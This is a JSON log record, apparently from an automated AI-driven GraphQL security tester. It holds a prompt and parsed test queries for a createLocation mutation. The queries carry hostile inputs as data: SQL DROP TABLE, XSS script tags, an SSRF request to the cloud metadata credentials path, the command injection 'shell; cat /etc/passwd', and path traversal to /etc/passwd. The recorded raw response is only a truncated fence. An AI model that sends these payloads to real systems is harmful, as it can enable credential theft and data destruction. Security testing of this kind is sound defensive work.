@@ -1,0 +1,56 @@
+{
+  "timestamp": "20251010_035626",
+  "endpoint": "createLocation",
+  "prompt": "\n    You are an expert in GraphQL API security testing.\n\n    Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types.\n\n    \n    CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types:\n    - SQL Injection\n    - XSS Injection\n    - SSRF Injection\n    - OS Command Injection\n    - Path Injection\n    - HTML Injection\n    - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased)\n    - Introspection\n    - Field Suggestions\n\n    Strict Requirements:\n    1) Queries must be syntactically valid GraphQL.\n    2) No placeholders like <id>, \"ID!\", \"value\". Use realistic literals or known real values.\n    3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate.\n    4) You may output 1 query(ies) but MUST cover all vulnerability types listed above.\n    5) Do not use the words \"edges\" or \"node\".\n    6) GraphQL is case-sensitive. Match the exact operation name: createLocation.\n    7) If there are previous response pairs, use them to generate the query.\n    8) For each vulnerability type, craft queries that specifically test for that vulnerability pattern.\n    9) CRITICAL: Label each query with its vulnerability type using the format: ***<vulnerability_type>*** before each ```graphql block.\n    10) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries:\n        - First query: Non-aliased version (normal query structure)\n        - Second query: Aliased version (using query aliases like \"s: queryName\")\n        Both queries should test the same operation but with different structures to test access control bypass.\n    \n        SCHEMA (authoritative):\n        - schema types: {'Location': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'ID!'}, {'name': 'lat', 'type': 'Float'}, {'name': 'lng', 'type': 'Float'}, {'name': 'name', 'type': 'String!'}]}}\n        - output fields (if known): Location\n        Use only fields/args compatible with this schema.\n        \n    Context:\n    - operation: createLocation\n    - input (declared): createLocation, input: {'lat': 'Float', 'lng': 'Float', 'name': 'String'}\n    - node type: mutation\n    - known real values: GraphQL source: query\nQuery: getUsers\nNode Type: User\n\nFields:\n- id: user-5\n- firstName: shell; cat /etc/passwd\n- description: attempt OS command injection via firstName\n- wallets: [{'id': 'wallet-7', 'name': 'Student Budget', 'balance': 0}]\nGraphQL source: query\nQuery: getUsers\nNode Type: User\n\nFields:\n- id: user-5\n- firstName: shell; cat /etc/passwd\n- description: attempt OS command injection via firstName\n- wallets: [{'id': 'wallet-7', 'name': 'Student Budget'}]\nGraphQL source: query\nQuery: getUsers\nNode Type: User\n\nFields:\n- id: 0b42c8e7-d78e-46b2-a152-a2bba13f0454\n- firstName: Jane\n- description: A new user created successfully.\n- wallets: []\nGraphQL source: query\nQuery: getUsers\nNode Type: User\n\nFields:\n- id: 0b42c8e7-d78e-46b2-a152-a2bba13f0454\n- firstName: Jane\n- description: A new user created successfully.\n- wallets: []\nGraphQL source: query\nQuery: getCurrencies\nNode Type: Currency\n\nFields:\n- id: f39992e9-98f5-4e6a-93a2-bc0a732d2e79\n- abbreviation: ec2-location-123456.us-east-2.compute.amazonaws.com\n\n    Argument strategy: synthesize realistic literals by type (e.g., ISO dates, small integers, emails, UUIDv4), avoid placeholders.\n    Selection depth target: 3. Keep nested selections no deeper than 3 levels.\n    \n    Output format:\n    Each query must be in its own fenced block with a vulnerability type label:\n    Vulnerability Type Labels Are:\n    - SQL_Injection\n    - XSS_Injection\n    - SSRF_Injection\n    - OS_Command_Injection\n    - Path_Injection\n    - HTML_Injection\n    - Query_Deny_Bypass_Non_Aliased\n    - Query_Deny_Bypass_Aliased\n    - Introspection\n    - Field_Suggestions\n    - Basic_Call\n\n    ***<Vulnerability Type>***\n    ```graphql\n    <your query>\n    ```\n    \n    Example:\n    ***SQL_Injection***\n    ```graphql\n    query {\n      users(filter: \"1' OR '1'='1\") {\n        id\n        name\n      }\n    }\n    ```\n    \n    ***XSS_Injection***\n    ```graphql\n    query {\n      search(term: \"<script>alert('xss')</script>\") {\n        results\n      }\n    }\n    ```\n    ",
+  "llm_response": "```",
+  "parsed_queries": {
+    "query": [
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 37.7749, lng: -122.4194, name: \"Golden Gate Bridge\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "basic_call"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 40.7128, lng: -74.0060, name: \"Robert'); DROP TABLE locations; --\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "sql_injection"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 51.5074, lng: -0.1278, name: \"<script>alert('xss')</script>\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "xss_injection"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 34.0522, lng: -118.2437, name: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "ssrf_injection"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 48.8566, lng: 2.3522, name: \"shell; cat /etc/passwd\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "os_command_injection"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 47.6062, lng: -122.3321, name: \"../../../../etc/passwd\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "path_injection"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 35.6895, lng: 139.6917, name: \"<img src=x onerror=\\\"alert('html')\\\" />\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "html_injection"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 52.52, lng: 13.4050, name: \"normal-bypass-test@example.com\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_non_aliased"
+      },
+      {
+        "query": "\nmutation createLocation {\n  s: createLocation(input: { lat: 52.52, lng: 13.4050, name: \"aliased-bypass-test@example.com\" }) {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_aliased"
+      },
+      {
+        "query": "\nquery createLocation {\n  createLocation {\n    mutationType {\n      name\n    }\n    queryType {\n      name\n    }\n  }\n}\n",
+        "vulnerability_type": "introspection"
+      },
+      {
+        "query": "\nmutation createLocation {\n  createLocation(input: { lat: 37.3382, lng: -121.8863, name: \"San Jose Test\" }) {\n    id\n    nane\n    name\n  }\n}\n",
+        "vulnerability_type": "field_suggestions"
+      }
+    ]
+  },
+  "approx_tokens": 1083.5,
+  "request_time": "2025-10-10T03:56:26.750900"
+}
